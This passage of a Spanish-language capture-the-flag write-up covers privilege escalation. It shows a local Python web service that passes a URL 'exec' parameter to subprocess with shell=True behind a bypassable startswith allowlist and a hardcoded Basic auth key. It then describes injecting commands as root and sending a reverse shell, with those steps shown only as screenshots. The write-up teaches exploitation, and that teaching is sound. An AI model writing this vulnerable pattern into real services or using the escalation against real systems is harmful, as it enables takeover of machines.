ICAgICAgICAgcmVzdWx0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoY29tbWFuZCwgc2hlbGw9VHJ1ZSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VUKQogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShyZXN1bHQpCiAgICAgICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLkNhbGxlZFByb2Nlc3NFcnJvciBhcyBlOgogICAgICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDUwMCkKICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9oZWFkZXIoIkNvbnRlbnQtdHlwZSIsICJ0ZXh0L3BsYWluIikKICAgICAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICAgICAgc2VsZi53ZmlsZS53cml0ZShlLm91dHB1dCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLnNlbmRfcmVzcG9uc2UoNDAwKQogICAgICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgICAgIHNlbGYuZW5kX2hlYWRlcnMoKQogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGIiTWlzc2luZyAnZXhlYycgcGFyYW1ldGVyIGluIFVSTCIpCgp3aXRoIHNvY2tldHNlcnZlci5UQ1BTZXJ2ZXIoKCIxMjcuMC4wLjEiLCBQT1JUKSwgSGFuZGxlcikgYXMgaHR0cGQ6CiAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkK'|base64 -d
```

```python
import http.server
import socketserver
import urllib.parse
import subprocess
import base64

PORT = 25000

AUTH_KEY_BASE64 = "MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo="

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get('Authorization')

        if auth_header is None or not auth_header.startswith('Basic'):
            self.send_response(401)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Authorization header is missing or incorrect")
            return

        # Extraer la clave enviada por el cliente (en Base64)
        encoded_key = auth_header.split('Basic ')[1]

        # Decodificar la clave almacenada en Base64
        decoded_stored_key = base64.b64decode(AUTH_KEY_BASE64).decode().strip()  # Eliminar saltos de línea

        # Decodificar la clave enviada por el cliente
        decoded_client_key = base64.b64decode(encoded_key).decode().strip()  # Eliminar saltos de línea

        # Comparar las claves
        if decoded_client_key != decoded_stored_key:
            self.send_response(403)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Invalid authorization key")
            return

        # Procesar el parámetro 'exec'
        parsed_path = urllib.parse.urlparse(self.path)
        query_params = urllib.parse.parse_qs(parsed_path.query)

        if 'exec' in query_params:
            command = query_params['exec'][0]
            try:
                allowed_commands = ['ls', 'whoami']
                if not any(command.startswith(cmd) for cmd in allowed_commands):
                    self.send_response(403)
                    self.send_header("Content-type", "text/plain")
                    self.end_headers()
                    self.wfile.write(b"Command not allowed.")
                    return

                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_response(200)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(result)
            except subprocess.CalledProcessError as e:
                self.send_response(500)
                self.send_header("Content-type", "text/plain")
                self.end_headers()
                self.wfile.write(e.output)
        else:
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Missing 'exec' parameter in URL")

with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as httpd:
    httpd.serve_forever()
```
resulta ser un servicio web levantado de forma local por el puerto `25000` y si detallamos un poco mas el codigo vemos que tiene un parametro `exec` y que es posible la ejecucion de los comandos `ls` y `whoami`; tmabien se observa que la peticion que espera recibir el servicio web contiene la cabecera `Authorization` y espera recibir por dicha cabecera lo siguiente: `Authorization: Basic MDAwMGN5YmVyc2VjX2dyb3VwX3J0XzAwMDAwMAo=`, asi que testeamos a ver como responde

![image](https://github.com/user-attachments/assets/41736ea7-a3fc-4d82-bbb0-119a4b7316ca)

responde correctamente

![image](https://github.com/user-attachments/assets/7974b515-a297-4bc5-ac15-4b43421625c9)

en efecto solo es permitido ejecutar `ls & whoami`, aunque si volvemos al codigo python que levanta el servicio web, podremos observar una vulnerabilidad que nos permitiria inyeccion de codigo

![image](https://github.com/user-attachments/assets/c9b21748-509f-47b7-b9d5-8fc0eea3cedc)

el uso de `subprocess` con `shell=True` se vuelve potencialmente peligroso cuando un usuario puede controlar el comando que se ejecutara ya que es posible la inyeccion de comandos saltando las limitaciones actuales, sabiendo esto, testeamos

![image](https://github.com/user-attachments/assets/f51d6a0f-6de2-460a-bc4c-2f26107a14db)

se consigue la inyeccion de comandos solo que como el usuario `darksblack` y no como `root`, aunque para solucionarlo basta con urlencodear el comando a ejecutar

![image](https://github.com/user-attachments/assets/8d1d4cc7-1755-4956-b1b0-503b66435a0e)

ahora si es ejecutado como `root`, ya solo queda tomar el control total enviando una revershell

![image](https://github.com/user-attachments/assets/34a65edf-6ca2-4688-9000-001825c1874e)

### root




























